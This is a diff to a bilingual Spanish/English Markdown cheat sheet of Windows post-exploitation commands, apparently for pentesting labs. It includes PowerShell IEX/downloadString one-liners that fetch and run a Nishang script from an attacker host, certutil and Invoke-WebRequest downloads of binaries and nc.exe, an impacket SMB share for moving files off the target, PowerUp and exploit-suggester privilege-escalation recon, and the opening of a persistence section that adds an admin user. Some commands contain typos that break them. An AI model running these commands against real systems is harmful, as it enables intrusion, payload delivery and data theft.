@@ -14,19 +14,23 @@ searchsploit -x <XploitPath>       #Examina el exploit
 searchsplot -m <XploitPath>        #Crea una copia del sploit en el directorio actual
 ```
 
-## Descargando Ficheros
-Descargando un script que nos de una buena powershell (nishang por ejemplo), comprobamos si estamos en un proceso de 64 bits y consideramos migrar a un proceso de 64 bits
+## File and Data Transfering
+Downloading a ps script to memory (Nishang for instance. Start /b to send the process to background
+It's better to use a native process so we have to check it out.
 ```bash
-start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<myIP>:<myPort>/ps.ps1") # start /b para que quede en segundo plano, pude quedar en un proceso de 32bits
+start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<myIP>:<myPort>/ps.ps1") # 
 [Environment]::Is64BitOperatingSystem
 [Environment]::Is64BitProcess
 C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<myIP>:<myPort>/ps.ps1")
--- 
+```
+### Downloading files from cmd
+```bash
 certutil.exe -f -urlcache -split http://<myIP>:<myPORT>/binary.exe nbinary.exe
 powershell -c "(New-Object System.Net.WebCliente).donwnloadFile('http://<myIP>:<myPORT>/binary.exe', 'C:\Windows\Tasks\binary.exe')
 powershell Invoke-WebRequest "http://<myIP>:<myPORT>/binary.exe" -OutFile "C:\Windows\Tasks\binary.exe"
+iwr -uri http://10.10.14.8/nc.exe -OutFile nc.exe
 ```
-### Descargando ficheros A traves de SAMBA
+### Downloading files with SAMBA
 ```bash
 impacket-smbserver smbFolder $(pwd) -smb2support   #En mi maquina
 ```
@@ -37,25 +41,28 @@ dir SharedFolder:\
 copy SharedFolder:\binary.exe C:\Windows\Tasks\binary.exe
 copy localFile.txt \\<myIP>\smbFolder\localFile.txt
 ```
-### Reconocimeinto y busqueda de exploits
+## Reconocimeinto y busqueda de exploits
 Hacemos git clone a PowerSploit y dentro del modulo/carpeta Privesc
 ```bash
 batgrep "function" PowerUp.ps1   #Ver funciones del script
 echo "Invoke-AllChecks" >> PowerUp.ps1
 ```
 Descargamos el script a la maquina para que se ejecute y esperamos la salida.
-#### Weseng
+### Weseng
 Clonamos weseng (Windows Exploit Suggester) para buscarle vulnerabilidades a la salida de SystemInfo
 ```bash
 python wes.py systemInfoOutput.txt
 python wes.py systemInfoOutput.txt -i "Elevation of privilege"
 ```
-#### Windows-Sploit-Suggester AonCyberLabs
+### Windows-Sploit-Suggester AonCyberLabs
 Clonamos Windows-Exploit-Suggester de AonCyberLabs
 ```zsh
 python windows-exploit-suggester.py --update   #Descarga un xlsx con registros
 python windows-exploit-suggester.py --database <unafecha>.xlsx --systeminfo systemInfoOutput.txt
 ```
+Tambien utilizar WinPEAS 
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+
 ## Persistencia y PostExplotacion
 Teniendo privilegios de root, creamos un usuario y lo incluimos en el grupo de administradores
 ```zsh
